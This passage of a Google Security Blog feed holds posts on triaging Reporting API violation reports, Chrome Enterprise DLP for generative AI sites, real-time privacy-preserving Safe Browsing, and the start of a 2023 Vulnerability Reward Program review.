</li><li>When all code locations have been identified and refactored, the policy can be removed from <em>report-only mode</em> and fully enforced. Note that in a typical roll out, we iterate steps 1 through 3 to ensure that we have triaged all violation reports. 
</li>
</ol>
<p>
With the Reporting API, we have the ability to run this cycle using a unified reporting endpoint and a single schema for several security features. This allows us to gather reports for a variety of features across different browsers, code paths, and types of users in a centralized way.</p>
<p><b>Note: </b>A violation report is generated when an entity is attempting an action that one of your policies forbids. For example, you've set CSP on one of your pages, but the page is trying to load a script that's not allowed by your CSP. Most reports generated via the Reporting API are violation reports, but not all — other types include deprecation reports and crash reports. For details, see <a href="https://developer.chrome.com/articles/reporting-api/#use_cases_and_report_types">Use cases and report types</a>.</p>
<p>
Unfortunately, it is common for noise to creep into streams of violation reports, which can make finding incompatible code locations difficult. For example, many browser extensions, malware, antivirus software, and devtools users inject third-party code into the DOM or use forbidden APIs. If the injected code is incompatible with the policy, this can lead to violation reports that cannot be linked to our code base and are therefore not actionable. This makes triaging reports difficult and makes it hard to be confident that all code locations have been addressed before enforcing new policies.
</p>
<p>
Over the years, Google has developed a number of techniques to collect, digest, and summarize violation reports into <em>root causes</em>.<em> </em>Here is a summary of the most useful techniques we believe developers can use to filter out noise in reported violations:
</p>
<h3 style="text-align: left;">Focus on root causes</h3>


<p>
It is often the case that a piece of code that is incompatible with the policy executes several times throughout the lifetime of a browser tab. Each time this happens, a new violation report is created and queued to be sent to the reporting endpoint. This can quickly lead to a large volume of individual reports, many of which contain redundant information. Because of this, grouping violation reports into clusters enables developers to abstract away individual violations and think in terms of root causes. Root causes are simpler to understand and can speed up the process of identifying useful refactorings. 
</p>
<p>
Let's take a look at an example to understand how violations may be grouped. For instance, a report-only CSP that forbids the use of inline JavaScript event handlers is deployed. Violation reports are created on every instance of those handlers and have the following fields set:
</p>
<ul>

<li>The <code>blockedURL</code> field is set to <code>inline</code>, which describes the type of violation.

</li><li>The <code>scriptSample</code> field is set to the first few bytes of the contents of the event handler in the field. 

</li><li>The <code>documentURL</code> field is set to the URL of the current browser tab. 
</li>
</ul>
<p>
Most of the time, these three fields uniquely identify the inline handlers in a given URL, even if the values of other fields differ. This is common when there are tokens, timestamps, or other random values across page loads. Depending on your application or framework, the values of these fields can differ in subtle ways, so being able to do fuzzy matches on reporting values can go a long way in grouping violations into actionable clusters. In some cases, we can group violations whose URL fields have known prefixes, for example all violations with URLs that start with <code>chrome-extension</code>, <code>moz-extension</code>, or <code>safari-extension</code> can be grouped together to set root causes in browser extensions aside from those in our codebase with a high degree of confidence.
</p>
<p>
Developing your own grouping strategies helps you stay focused on root causes and can significantly reduce the number of violation reports you need to triage. In general, it should always be possible to select fields that uniquely identify interesting types of violations and use those fields to prioritize the most important root causes.
</p>
<h3 style="text-align: left;">Leverage ambient information</h3>


<p>
Another way of distinguishing non-actionable from actionable violation reports is ambient information. This is data that is contained in requests to our reporting endpoint, but that is not included in the violation reports themselves. Ambient information can hint at sources of noise in a client's set up that can help with triage:
</p>
<ul>

<li><strong>User Agent or <a href="https://developer.chrome.com/docs/privacy-security/user-agent-client-hints">User Agent client hints</a>:</strong> User agents are a great tell-tale sign of non-actionable violations. For example, crawlers, bots, and some mobile applications use custom user agents whose behavior differs from well-supported browser engines and that can trigger unique violations. In other cases, some violations may only trigger in a specific browser or be caused by changes in nightly builds or newer versions of browsers. Without user agent information, these violations would be significantly more difficult to investigate. <br />

</li><li><strong>Trusted users: </strong>Browsers will attach any available cookies to requests made to a reporting endpoint by the Reporting API, if the endpoint is same-site with the document where the violation occurs. Capturing cookies is useful for identifying the type of user that caused a violation. Often, the most actionable violations come from trusted users that are not likely to have invasive extensions or malware, like company employees or website administrators. If you are not able to capture authentication information through your reporting endpoint, consider rolling out report-only policies to trusted users first. Doing so allows you to build a baseline of actionable violations before rolling out your policies to the general public.<br />

</li><li><strong>Number of unique users: </strong>As a general principle, users of typical features or code paths should generate roughly the same violations. This allows us to flag violations seen by a small number of users as potentially suspicious, since they suggest that a user's particular setup might be at fault, rather than our application code. One way of 'counting users' is to keep note of the number of unique IP addresses that reported a violation. Approximate counting algorithms are simple to use and can help gather this information without tracking specific IP addresses. For example, the <a href="https://en.wikipedia.org/wiki/HyperLogLog">HyperLogLog</a> algorithm requires just a few bytes to approximate the number of unique elements in a set with a high degree of confidence.
</li>
</ul>
<h3 style="text-align: left;">Map violations to source code (advanced)</h3>


<p>
Some types of violations have a <code>source_file</code> field or equivalent. This field represents the JavaScript file that triggered the violation and is usually accompanied by a line and column number. These three bits of data are a high-quality signal that can point directly to lines of code that need to be refactored. 
</p>
<p>
Nevertheless, it is often the case that source files fetched by browsers are compiled or minimized and don't map directly to your code base. In this case, we recommend you use JavaScript source maps to map line and column numbers between <a href="https://developer.chrome.com/blog/new-in-devtools-104#authored-deployed">deployed and authored files</a>. This allows you to translate directly from violation reports to lines of source code, yielding highly actionable report groups and root causes.
</p>
<h1>Establish your own solution</h1>


<p>
The Reporting API sends browser-side events, such as security violations, deprecated API calls, and browser interventions, to the specified endpoint on a per-event basis. However, as explained in the previous section, to distill the real issues out of those reports, you need a data processing system on your end.
</p>
<p>
Fortunately, there are plenty of options in the industry to set up the required architecture, including open source products. The fundamental pieces of the required system are the following:
</p>
<ul>

<li><strong>API endpoint</strong>: A web server that accepts HTTP requests and handles reports in a JSON format

</li><li><strong>Storage</strong>: A storage server that stores received reports and reports processed by the pipeline

</li><li><strong>Data pipeline</strong>: A pipeline that filters out noise and extracts and aggregates required metadata into constellations

</li><li><strong>Data visualizer</strong>: A tool that provides insights on the processed reports
</li>
</ul>
<p>
Solutions for each of the components listed above are made available by public cloud platforms, SaaS services, and as open source software. See the <a href="?tab=t.0#heading=h.8mq1xpwkxy0y">Alternative solutions</a> section for details, and the following section outlining a sample application.
</p>
<h3 style="text-align: left;">Sample application: Reporting API Processor</h3>


<p>
To help you understand how to receive reports from browsers and how to handle these received reports, we created a <a href="https://github.com/googlecloudplatform/reporting-api-processor">small sample application</a> that demonstrates the following processes that are required for distilling web application security issues from reports sent by browsers:
</p>
<ul>

<li>Report ingestion to the storage

</li><li>Noise reduction and data aggregation

</li><li>Processed report data visualization
</li>
</ul>
<p>
Although this sample is relying on Google Cloud, you can replace each of the components with your preferred technologies. An overview of the sample application is illustrated in the following diagram:
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgD_8vdQRYuPLcnfkVozbtRJgPHlvUnh2dWNnnqxke-z1yw0cvB8o8VhqV9zf5tTXK3VM1kbGodegk94CM9sy3Z5h9_wd6ckkQCa_NB-UnmHaJhIbYw7yRxvBqRN9PtTrgX7V7PoO3A8v0WIcjlNR8pdO2rtLVQp66WfAXG3Ta-GZG84pjvxIEJOyPOKwl5/s3146/Diagram.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgD_8vdQRYuPLcnfkVozbtRJgPHlvUnh2dWNnnqxke-z1yw0cvB8o8VhqV9zf5tTXK3VM1kbGodegk94CM9sy3Z5h9_wd6ckkQCa_NB-UnmHaJhIbYw7yRxvBqRN9PtTrgX7V7PoO3A8v0WIcjlNR8pdO2rtLVQp66WfAXG3Ta-GZG84pjvxIEJOyPOKwl5/s16000/Diagram.png" /></a></div><br /><p><br /></p>
<p>
Components described as green boxes are components that you need to implement by yourself. <em>Forwarder </em>is a simple web server that receives reports in the JSON format and converts them to the schema for Bigtable. <em>Beam-collector</em> is a simple Apache Beam pipeline that filters noisy reports, aggregates relevant reports into the shape of constellations, and saves them as CSV files. These two components are the key parts to make better use of reports from the Reporting API.
</p>
<h3 style="text-align: left;">Try it yourself</h3>


<p>
Because this is a runnable sample application, you are able to deploy all components to a Google Cloud project and see how it works by yourself. The detailed prerequisites and the instructions to set up the sample system are documented in the <a href="https://github.com/GoogleCloudPlatform/reporting-api-processor/blob/main/README.md">README.md</a> file.
</p>
<h1>Alternative solutions</h1>


<p>
Aside from the open source solution we shared, there are a number of tools available to assist in your usage of the Reporting API. Some of them include:
</p>
<ul>

<li>Report-collecting services like <a href="https://report-uri.com/">report-uri</a> and <a href="https://www.uriports.com/">uriports</a>.

</li><li>Application error monitoring platforms like Sentry, Datadog, etc.
</li>
</ul>
<p>
Besides pricing, consider the following points when selecting alternatives:
</p>
<ul>

<li>Are you comfortable sharing any of your application's URLs with a third-party report collector? Even if the browser strips sensitive information from these URLs, sensitive information <a href="https://w3c.github.io/reporting/#capability-urls">may get leaked this way</a>. If this sounds too risky for your application, operate your own reporting endpoint.

</li><li>Does this collector support all report types you need? For example, not all reporting endpoint solutions support COOP/COEP violation reports.
</li>
</ul>
<h1>Summary</h1>


<p>
In this article, we explained how web developers can collect client-side issues by using the Reporting API, and the challenges of distilling the real problems out of the collected reports. We also introduced how Google solves those challenges by filtering and processing reports, and shared an open source project that you can use to replicate a similar solution. We hope this information will motivate more developers to take advantage of the Reporting API and, in consequence, make their website more secure and sustainable.
</p>
<h1>Learning resources</h1>


<ul>

<li><a href="https://developer.chrome.com/docs/capabilities/web-apis/reporting-api">Monitor your web application with the Reporting API  |  Capabilities  |  Chrome for Developers</a>

</li><li><a href="https://bughunters.google.com/blog/5896512897417216/a-recipe-for-scaling-security">A Recipe for Scaling Security – Google Bug Hunters</a>
</li></ul>
]]></content:encoded>
<pubDate>2024-04-23T13:15:47.498-04:00</pubDate>
</item>
<item>
<title>Prevent Generative AI Data Leaks with Chrome Enterprise DLP</title>
<link>http://security.googleblog.com/2024/04/prevent-generative-ai-data-leaks-with.html</link>
<guid>http://security.googleblog.com/2024/04/prevent-generative-ai-data-leaks-with.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted Kaleigh Rosenblat, Chrome Enterprise Senior Staff Software Engineer, Security Lead </span>

<p>
Generative AI has emerged as a powerful and popular tool to automate content creation and simple tasks. From customized content creation to source code generation, it can increase both our productivity and creative potential.
</p>
<p>
Businesses want to leverage the power of LLMs, like Gemini, but many may have security concerns and want more control around how employees make sure of these new tools. For example, companies may want to ensure that various forms of sensitive data, such as Personally Identifiable Information (PII), financial records and internal intellectual property, is not to be shared publicly on Generative AI platforms. Security leaders face the challenge of finding the right balance — enabling employees to leverage AI to boost efficiency, while also safeguarding corporate data.
</p>
<p>
In this blog post, we'll explore reporting and enforcement policies that enterprise security teams can implement within <a href="https://chromeenterprise.google/products/chrome-enterprise-premium/">Chrome Enterprise Premium</a> for data loss prevention (DLP).</p><p>1.&nbsp;<strong>View login events*</strong> to understand usage of Generative AI services within the organization. With <a href="https://support.google.com/chrome/a/answer/11375053?hl=en">Chrome Enterprise's Reporting Connector</a>, security and IT teams can see when a user successfully signs into a specific domain, including Generative AI websites. Security Operations teams can further leverage this telemetry to detect anomalies and threats by streaming the data into <a href="https://chronicle.security/">Chronicle</a> or other <a href="https://support.google.com/chrome/a/answer/11375053?hl=en">third-party SIEMs</a> at no additional cost.</p><p>2.&nbsp;<strong>Enable URL Filtering </strong>to warn users about sensitive data policies and let them decide whether or not they want to navigate to the URL, or to block users from navigating to certain groups of sites altogether.</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMt_f50AXMmZyo61C-WE0P4SSv2a8gO3VvV0JxW8uH84Mc-Np618NK3_KMmg4U-O9MmZnjwE7OP3FuhBT5e9tABl3N3V44MvsYaz9rSX50GxGuL5gQ3aDE5AyfPtb-nxB_0Y1rW19AV1ogvt8ZKRd4r6rwrLQreQzWWOiSVfAayedBAASUdLC330oiNY9w/s1274/unnamed%20(1).png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMt_f50AXMmZyo61C-WE0P4SSv2a8gO3VvV0JxW8uH84Mc-Np618NK3_KMmg4U-O9MmZnjwE7OP3FuhBT5e9tABl3N3V44MvsYaz9rSX50GxGuL5gQ3aDE5AyfPtb-nxB_0Y1rW19AV1ogvt8ZKRd4r6rwrLQreQzWWOiSVfAayedBAASUdLC330oiNY9w/s16000/unnamed%20(1).png" /></a></div><br /><p>For example, with Chrome Enterprise URL Filtering, IT admins can create rules that warn developers  not to submit source code to specific Generative AI apps or tools, or block them.</p><p>3.&nbsp;<strong>Warn, block or monitor sensitive data actions within Generative AI websites </strong>with dynamic content-based rules for actions like paste, file uploads/downloads, and print.&nbsp;<a href="https://support.google.com/a/answer/10104463?hl=en">Chrome Enterprise DLP rules</a> give IT admins granular control over browser activities, such as entering financial information in Gen AI websites. Admins can customize DLP rules to restrict the type and amount of data entered into these websites from managed browsers.</p><p>For most organizations, safely leveraging Generative AI requires a certain amount of control. As enterprises work through their policies and processes involving GenAI, <a href="https://chromeenterprise.google/browser/">Chrome Enterprise Premium</a> empowers them to strike the balance that works best. Hear directly from security leaders at Snap on their use of DLP for Gen AI in <a href="https://youtu.be/9f97uhY6iW0?feature=shared&amp;t=439">this recording here.</a></p><p>Learn more about how Chrome Enterprise can secure businesses just like yours <a href="https://chromeenterprise.google/products/chrome-enterprise-premium/">here</a>.</p><p>*Available at no additional cost in <a href="https://chromeenterprise.google/products/cloud-management/">Chrome Enterprise Core</a></p>
]]></content:encoded>
<pubDate>2024-04-18T13:40:42.728-04:00</pubDate>
</item>
<item>
<title>Real-time, privacy-preserving URL protection</title>
<link>http://security.googleblog.com/2024/03/blog-post.html</link>
<guid>http://security.googleblog.com/2024/03/blog-post.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Jasika Bawa, Xinghui Lu, Google Chrome Security &amp; Jonathan Li, Alex Wozniak, Google Safe Browsing
</span>
<p>
For more than 15 years, Google Safe Browsing has been protecting users from phishing, malware, unwanted software and more, by identifying and warning users about potentially abusive sites on more than 5 billion devices around the world. As attackers grow more sophisticated, we've seen the need for protections that can adapt as quickly as the threats they defend against. That’s why we're excited to announce a new version of Safe Browsing that will provide real-time, privacy-preserving URL protection for people using the <a href="https://support.google.com/chrome/answer/9890866">Standard protection</a> mode of Safe Browsing in Chrome.
</p>
<h3 style="text-align: left;">Current landscape</h3>


<p>
Chrome automatically protects you by flagging potentially dangerous sites and files, hand in hand with Safe Browsing which discovers thousands of unsafe sites every day and adds them to its lists of harmful sites and files.
</p>
<p>
So far, for privacy and performance reasons, Chrome has first checked sites you visit against a locally-stored list of known unsafe sites which is updated every 30 to 60 minutes  –&nbsp;this is done using <a href="https://security.googleblog.com/2022/08/how-hash-based-safe-browsing-works-in.html">hash-based checks</a>.
</p>
<p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_QBMYx1Gz7H8twUQnE1pRiD8H0m2ckUodFJL0ySh23eh8foVsehxwVO9eu_JwL2BRI1LLUSEKFhJZsHx9IqHBzNCanJpKwHS0hNWn_nJL85jL64nQZTFJMqAkKc0KuU0Q6BnKGiAptLQUFSaHF1lZ1JfrBUxufZx8OPdFw1vjgoFhSjvaMSfZSsQXs2cz/s1428/Screenshot%202024-03-13%203.39.50%20PM.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_QBMYx1Gz7H8twUQnE1pRiD8H0m2ckUodFJL0ySh23eh8foVsehxwVO9eu_JwL2BRI1LLUSEKFhJZsHx9IqHBzNCanJpKwHS0hNWn_nJL85jL64nQZTFJMqAkKc0KuU0Q6BnKGiAptLQUFSaHF1lZ1JfrBUxufZx8OPdFw1vjgoFhSjvaMSfZSsQXs2cz/s16000/Screenshot%202024-03-13%203.39.50%20PM.png" /></a></div><div class="separator" style="clear: both; text-align: center;"><br /></div><p></p><p style="text-align: center;">
<em>Hash-based check overview</em>
</p>
<p style="text-align: left;">
But unsafe sites have adapted — today, the majority of them exist for less than 10 minutes, meaning that by the time the locally-stored list of known unsafe sites is updated, many have slipped through and had the chance to do damage if users happened to visit them during this window of opportunity. Further, Safe Browsing’s list of harmful websites continues to grow at a rapid pace. Not all devices have the resources necessary to maintain this growing list, nor are they always able to receive and apply updates to the list at the frequency necessary to benefit from full protection.
</p>
<p>
Safe Browsing’s <a href="https://security.googleblog.com/2020/05/enhanced-safe-browsing-protection-now.html">Enhanced protection</a> mode already stays ahead of such threats with technologies such as real-time list checks and AI-based classification of malicious URLs and web pages. We built this mode as an opt-in to give users the choice of sharing more security-related data in order to get stronger security. This mode has shown that checking lists in real time brings significant value, so we decided to bring that to the default Standard protection mode through a new API – one that doesn't share the URLs of sites you visit with Google.
</p>
<h3 style="text-align: left;">Introducing real-time, privacy-preserving Safe Browsing</h3>


<h2 style="text-align: left;">How it works</h2>


<p>
In order to transition to real-time protection, checks now need to be performed against a list that is maintained on the Safe Browsing server. The server-side list can include unsafe sites as soon as they are discovered, so it is able to capture sites that switch quickly. It can also grow as large as needed because the Safe Browsing server is not constrained in the same way that user devices are.
</p>
<p>
Behind the scenes, here's what is happening in Chrome:
</p>
<ol>

<li>When you visit a site, Chrome first checks its cache to see if the address (URL) of the site is already known to be safe (see the “Staying speedy and reliable” section for details).

</li><li>If the visited URL is not in the cache, it may be unsafe, so a real-time check is necessary.

</li><li>Chrome obfuscates the URL by following the <a href="https://developers.google.com/safe-browsing/v4/urls-hashing">URL hashing guidance</a> to convert the URL into 32-byte full hashes. 

</li><li>Chrome truncates the full hashes into 4-byte long hash prefixes.

</li><li>Chrome encrypts the hash prefixes and sends them to a privacy server (see the “Keeping your data private” section for details).

</li><li>The privacy server removes potential user identifiers and forwards the encrypted hash prefixes to the Safe Browsing server via a TLS connection that mixes requests with many other Chrome users.

</li><li>The Safe Browsing server decrypts the hash prefixes and matches them against the server-side database, returning full hashes of all unsafe URLs that match one of the hash prefixes sent by Chrome.

</li><li>After receiving the unsafe full hashes, Chrome checks them against the full hashes of the visited URL.

</li><li>If any match is found, Chrome will show a warning.
</li>
</ol>
<h2 style="text-align: left;">Keeping your data private</h2>


<p>
In order to preserve user privacy, we have partnered with <a href="https://www.fastly.com/blog/enabling-privacy-on-the-internet-with-oblivious-http">Fastly</a>, an edge cloud platform that provides content delivery, edge compute, security, and observability services, to operate an <a href="https://datatracker.ietf.org/doc/rfc9458/">Oblivious HTTP</a> (OHTTP) privacy server between Chrome and Safe Browsing – you can learn more about Fastly's commitment to user privacy on their <a href="https://www.fastly.com/solutions/customer-trust">Customer Trust page</a>. With OHTTP, Safe Browsing does not see your IP address, and your Safe Browsing checks are mixed amongst those sent by other Chrome users. This means Safe Browsing cannot correlate the URL checks you send as you browse the web.
</p>
<p>
Before hash prefixes leave your device, Chrome encrypts them using a public key from Safe Browsing. These encrypted hash prefixes are then sent to the privacy server. Since the privacy server doesn’t know the private key, it cannot decrypt the hash prefixes, which offers privacy from the privacy server itself.
</p>
<p>
The privacy server then removes potential user identifiers such as your IP address and forwards the encrypted hash prefixes to the Safe Browsing server. The privacy server is operated independently by Fastly, meaning that Google doesn’t have access to potential user identifiers (including IP address and User Agent) from the original request. Once the Safe Browsing server receives the encrypted hash prefixes from the privacy server, it decrypts the hash prefixes with its private key and then continues to check the server-side list.
</p>
<p>
Ultimately, Safe Browsing sees the hash prefixes of your URL but not your IP address, and the privacy server sees your IP address but not the hash prefixes. No single party has access to both your identity and the hash prefixes. As such, your browsing activity remains private.</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWX4X0IOWMDxOgv4_2z033z3i327gXtjV0U0eTdW2XRAxKJPp-_oaIplWUUwJBgt-UNvwNnhlHNPz30O26SVDKK1GImmt_-L0qYhMT-P8N00bMv3ufXZw4TxxTQoTOsXUWx7wUNzoQ05AQwdJn9vXMJmBQR-HG3yY1yW09GrvK1XXrF7Awe3mTxTnY9N-1/s2030/Screenshot%202024-03-13%203.41.41%20PM.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWX4X0IOWMDxOgv4_2z033z3i327gXtjV0U0eTdW2XRAxKJPp-_oaIplWUUwJBgt-UNvwNnhlHNPz30O26SVDKK1GImmt_-L0qYhMT-P8N00bMv3ufXZw4TxxTQoTOsXUWx7wUNzoQ05AQwdJn9vXMJmBQR-HG3yY1yW09GrvK1XXrF7Awe3mTxTnY9N-1/s16000/Screenshot%202024-03-13%203.41.41%20PM.png" /></a></div><p></p><p style="text-align: center;">
<em>Real-time check overview</em>
</p>
<h2 style="text-align: left;">Staying speedy and reliable</h2>


<p>
Compared with the hash-based check, the real-time check requires sending a request to a server, which adds additional latency. We have employed a few techniques to make sure your browsing experience continues to be smooth and responsive.
</p>
<p>
First, before performing the real-time check, Chrome checks against a global and local cache on your device to avoid unnecessary delay.
</p>
<ul>

<li>The global cache is a list of hashes of known-safe URLs that is served by Safe Browsing. Chrome fetches it in the background. If any full hash of the URL is found in the global cache, Chrome will consider it less risky and perform a hash-based check instead.

</li><li>The local cache, on the other hand, is a list of full hashes that are saved from previous Safe Browsing checks. If there is a match in the local cache, and the cache has not yet expired, Chrome will not send a real-time request to the Safe Browsing server.
</li>
</ul>
<p>
Both caches are stored in memory, so it is much faster to check them than sending a real-time request over the network.
</p>
<p>
In addition, Chrome follows a fallback mechanism in case of unsuccessful or slow requests. If the real-time request fails consecutively, Chrome will enter a back-off mode and downgrade the checks to hash-based checks for a certain period.
</p>
<p>
We are also in the process of introducing an <a href="https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html">asynchronous mechanism</a>, which will allow the site to load while the real-time check is in progress. This will improve the user experience, as the real-time check won’t block page load.
</p>
<h3 style="text-align: left;">What real-time, privacy-preserving URL protection means for you</h3>


<h2 style="text-align: left;">Chrome users</h2>


<p>
With the latest release of Chrome for desktop, Android, and iOS, we’re upgrading the Standard protection mode of Safe Browsing so it will now check sites using Safe Browsing’s real-time protection protocol, without sharing your browsing history with Google. You don't need to take any action to benefit from this improved functionality.
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_2OYwTAxTggg27lIbawjb3dauEA8leW3aXfhYH-_xVjs-b_VASp92zpqARvsUX37tJKY4r6isvOE7KuHzo-PCGrfq-1R5rblAbpH2eDHi1NdWGzMdae43y143xiaYLS5DhKzbq0FEjkadtT0lzktQq2HcjBlAbKykUCn0CyJaQmIjeCV4gY3eVtnWd1q1/s3200/Red%20interstitial.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_2OYwTAxTggg27lIbawjb3dauEA8leW3aXfhYH-_xVjs-b_VASp92zpqARvsUX37tJKY4r6isvOE7KuHzo-PCGrfq-1R5rblAbpH2eDHi1NdWGzMdae43y143xiaYLS5DhKzbq0FEjkadtT0lzktQq2HcjBlAbKykUCn0CyJaQmIjeCV4gY3eVtnWd1q1/s16000/Red%20interstitial.png" /></a></div>
<p>
If you want more protection, we still encourage you to turn on the <a href="https://support.google.com/chrome/answer/9890866">Enhanced protection</a> mode of Safe Browsing. You might wonder why you need enhanced protection when you'll be getting real-time URL protection in Standard protection – this is because in Standard protection mode, the real-time feature can only protect you from sites that Safe Browsing has already confirmed to be unsafe. On the other hand, Enhanced protection mode is able to use additional information together with advanced machine learning models to protect you from sites that Safe Browsing may not yet have confirmed to be unsafe, for example because the site was only very recently created or is cloaking its true behavior to Safe Browsing’s detection systems. 
</p>
<p>
Enhanced protection also continues to offer protection beyond real-time URL checks, for example by providing deep scans for suspicious files and extra protection from suspicious Chrome extensions.
</p>
<h2 style="text-align: left;">Enterprises</h2>


<p>
The real-time feature of the Standard protection mode of Safe Browsing is on by default for Chrome. If needed, it may be configured using the policy <a href="https://chromeenterprise.google/policies/#SafeBrowsingProxiedRealTimeChecksAllowed">SafeBrowsingProxiedRealTimeChecksAllowed</a>. It is also worth noting that in order for this feature to work in Chrome, enterprises may need to explicitly allow traffic to the Fastly privacy server. If the server is not reachable, Chrome will downgrade the checks to hash-based checks.
</p>
<h2 style="text-align: left;">Developers</h2>


<p>
While Chrome is the first surface where these protections are available, we plan to make them available to eligible developers for non-commercial use cases via the Safe Browsing API. Using the API, developers and privacy server operators can partner to better protect their products’ users from fast-moving malicious actors in a privacy-preserving manner. To learn more, keep an eye out for our upcoming developer documentation to be published on the <a href="https://developers.google.com/">Google for Developers</a> site.
</p>
]]></content:encoded>
<pubDate>2024-03-14T12:01:32.039-04:00</pubDate>
</item>
<item>
<title>Vulnerability Reward Program: 2023 Year in Review</title>
<link>http://security.googleblog.com/2024/03/vulnerability-reward-program-2023-year.html</link>
<guid>http://security.googleblog.com/2024/03/vulnerability-reward-program-2023-year.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Sarah Jacobus, Vulnerability Rewards Team</span>

<p>
Last year, we again witnessed the power of community-driven security efforts as researchers from around the world contributed to help us identify and address thousands of vulnerabilities in our products and services. Working with our dedicated bug hunter community, we awarded $10 million to our 600+ researchers based in 68 countries. 
</p>
<p>
<strong>New Resources and Improvements</strong>
</p>
<p>
Just like every year, 2023 brought a series of changes and improvements to our vulnerability reward programs:
</p>
<ul>

<li>Through our new <a href="https://bughunters.google.com/about/rules/5429687846305792/bonus-awards-rules">Bonus Awards</a> program, we now periodically offer time-limited, extra rewards for reports to specific VRP targets.

<li>We expanded our <a href="https://security.googleblog.com/2023/10/expanding-our-exploit-reward-program-to.html">exploit reward program</a> to Chrome and Cloud through the launch of  v8CTF, a CTF focused on V8, the JavaScript engine that powers Chrome.

<li>We launched <a href="https://bughunters.google.com/about/rules/6618732618186752/google-mobile-vulnerability-reward-program-rules">Mobile VRP</a> which focuses on first-party Android applications.

<li>Our <a href="https://bughunters.google.com/blog">new Bughunters blog</a> shared ways in which we make the internet, as a whole, safer, and what that journey entails. Take a look at our ever-growing repository of posts!

<li>To further our engagement with top security researchers, we also hosted our yearly security conference ESCAL8 in Tokyo. It included live hacking events and competitions, student training with our <a href="https://twitter.com/GoogleVRP/status/1711207378283360435">init.g workshops</a>, and talks from researchers and Googlers. Stay tuned for details on ESCAL8 2024.
</li>
</ul>
<p>
As in <a href="https://security.googleblog.com/2023/02/vulnerability-reward-program-2022-year.html">past years</a>, we are sharing our 2023 Year in Review statistics across all of our programs. We would like to give a special thank you to all of our dedicated researchers for their continued work with our programs - we look forward to more collaboration in the future! 
</p>
<p>

<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWt1z3F2xKYVKHQ55TTVAUz5cWXCJLHnlDIfXgDtuip4ZbA2rNEdTOR_VYeQzdeeAOjLifMrc2XUeSrgIzUiX0v_n-PkI6rVIMv2VixBOvzi1_iI3OO15KZWlMU7Z1XsVa7dEgzCDQnU6gLYMaiBONn8hxzB8lLiTpoEnFz42W0Ac7F3tRKhyphenhyphenRdlet55PX/s1600/21707_ANC_VRPInfographic_opt2.1%20%281%29.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWt1z3F2xKYVKHQ55TTVAUz5cWXCJLHnlDIfXgDtuip4ZbA2rNEdTOR_VYeQzdeeAOjLifMrc2XUeSrgIzUiX0v_n-PkI6rVIMv2VixBOvzi1_iI3OO15KZWlMU7Z1XsVa7dEgzCDQnU6gLYMaiBONn8hxzB8lLiTpoEnFz42W0Ac7F3tRKhyphenhyphenRdlet55PX/s1600/21707_ANC_VRPInfographic_opt2.1%20%281%29.png" /></a></div>

<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjl5kKVsUBd9_CXQohVT1IVZ_LSmaDPpfL8NaGOfflVQKxWb48vnOxPeFuC8eHQ_zkwyMH8cTXmGQBNBIsYsWvTHZ9M0J1PJjSDO8NUrLpX54dih1dOqdOF_MfJkxAKct1Nv4Ej6CwWemDk3he1DianxDP0Qwh1qNTObFLbdVURXme-jUq6YfrSmbffk52n/s1600/21707_ANC_VRPInfographic_opt1.2.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjl5kKVsUBd9_CXQohVT1IVZ_LSmaDPpfL8NaGOfflVQKxWb48vnOxPeFuC8eHQ_zkwyMH8cTXmGQBNBIsYsWvTHZ9M0J1PJjSDO8NUrLpX54dih1dOqdOF_MfJkxAKct1Nv4Ej6CwWemDk3he1DianxDP0Qwh1qNTObFLbdVURXme-jUq6YfrSmbffk52n/s1600/21707_ANC_VRPInfographic_opt1.2.png" /></a></div>
<p>
<strong>Android and Google Devices</strong>
</p>
<p>
In 2023, the Android VRP achieved significant milestones, reflecting our dedication to securing the Android ecosystem. We awarded over $3.4 million in rewards to researchers who uncovered remarkable vulnerabilities within Android and <a href="https://security.googleblog.com/2023/05/new-android-google-device-VRP.html">increased our maximum reward amount</a> to $15,000 for critical vulnerabilities. We also saw a sharpened focus on higher severity issues as a result of our changes to incentivize report quality and increasing rewards for high and critical severity issues. 
</p>
<p>
Expanding our program’s scope, Wear OS has been added to the program to further incentivize research in new wearable technology to ensure users’ safety.
</p>
<p>
Working closely with top researchers at the ESCAL8 conference, we also hosted a live hacking event for Wear OS and Android Automotive OS which resulted in $70,000 rewarded to researchers for finding over 20 critical vulnerabilities!
</p>
<p>
We would also like to spotlight the <a href="http://hardwear.io">hardwear.io</a> security conferences. Hardwear.io gave us a platform to engage with top hardware security researchers who uncovered over 50 vulnerabilities in Nest, Fitbit, and Wearables, and received a total of $116,000 last year!
</p>
<p>
